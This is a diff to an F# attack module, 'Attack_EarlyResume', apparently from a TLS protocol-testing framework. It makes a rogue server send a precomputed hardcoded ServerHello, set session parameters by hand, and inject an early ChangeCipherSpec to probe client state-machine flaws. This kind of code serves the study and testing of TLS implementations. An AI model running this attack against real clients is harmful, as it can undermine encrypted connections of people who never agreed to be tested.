@@ -22,8 +22,25 @@ open FlexState
 open FlexSecrets
 open FlexHandshake
 
+open System
 
+let fromHex (s:string) = 
+  s
+  |> Seq.windowed 2
+  |> Seq.mapi (fun i j -> (i,j))
+  |> Seq.filter (fun (i,j) -> i % 2=0)
+  |> Seq.map (fun (_,j) -> Byte.Parse(new System.String(j),System.Globalization.NumberStyles.AllowHexSpecifier))
+  |> Array.ofSeq
 
+// with sid
+//let shs = "02000051030154647E725994C1AF4F5C96FB7C5A83F4094E935BC884A03ECAC7178B883FCC1420B963BE87EEA6FA2562C4ECCF50DC97B2E1C9B07AC2CCBF28F976984D088E1A99002F000009FF0100010000230000"
+//without sid
+let shs = "02000031030154647E725994C1AF4F5C96FB7C5A83F4094E935BC884A03ECAC7178B883FCC1400002F000009FF0100010000230000"
+let shb = abytes (fromHex shs)
+let srandb = abytes (fromHex "54647E725994C1AF4F5C96FB7C5A83F4094E935BC884A03ECAC7178B883FCC14")
+
+let sticks = "0400000B0000AAAA00051122334455"
+let stickb = abytes (fromHex sticks)
 
 type Attack_EarlyResume =
     class
@@ -35,9 +52,24 @@ type Attack_EarlyResume =
         let st,_ = FlexConnection.serverOpenTcpConnection("0.0.0.0",cn,port) in
 
         let st,nsc,fch = FlexClientHello.receive(st) in
-        let fsh = {FlexConstants.nullFServerHello with
-                   pv=Some(TLS_1p0); ciphersuite=Some(TLS_RSA_WITH_AES_128_CBC_SHA)} in
-        let st,nsc,fsh = FlexServerHello.send(st,fch,nsc,fsh) in
+        //let fsh = {FlexConstants.nullFServerHello with
+        //           pv=Some(TLS_1p0); ciphersuite=Some(TLS_RSA_WITH_AES_128_CBC_SHA)} in
+        //let st,nsc,fsh = FlexServerHello.send(st,fch,nsc,fsh) in
+
+        // Send precomputed server hello...
+        let st = FlexHandshake.send(st,shb) in
+        // ... and manually set the next security context
+        let si = {nsc.si with
+            sessionID        = empty_bytes;
+            protocol_version = TLS_1p0;
+            cipher_suite     = TLSConstants.cipherSuite_of_name TLS_RSA_WITH_AES_128_CBC_SHA;
+            compression      = NullCompression;
+            extensions       = FlexConstants.nullNegotiatedExtensions;
+            init_srand       = srandb;
+        } in
+        let nsc = {nsc with si = si; srand = srandb} in
+        // Send precomputed session ticket
+        //let st = FlexHandshake.send(st,stickb) in
 
         // Inject early CCS and start encrypting early
         let st,_         = FlexCCS.send(st) in
@@ -49,7 +81,9 @@ type Attack_EarlyResume =
         let nsc = FlexSecrets.fillSecrets(st,Server,nsc) in
         let st  = FlexState.installWriteKeys st nsc in
 
-        let log          = fch.payload @| fsh.payload in
+        let log          = fch.payload @| shb
+                           //@| stickb
+        in
         let st,ffS       = FlexFinished.send(st,nsc,logRole=(log,Server)) in
         let st,_,_       = FlexCCS.receive(st) in
 
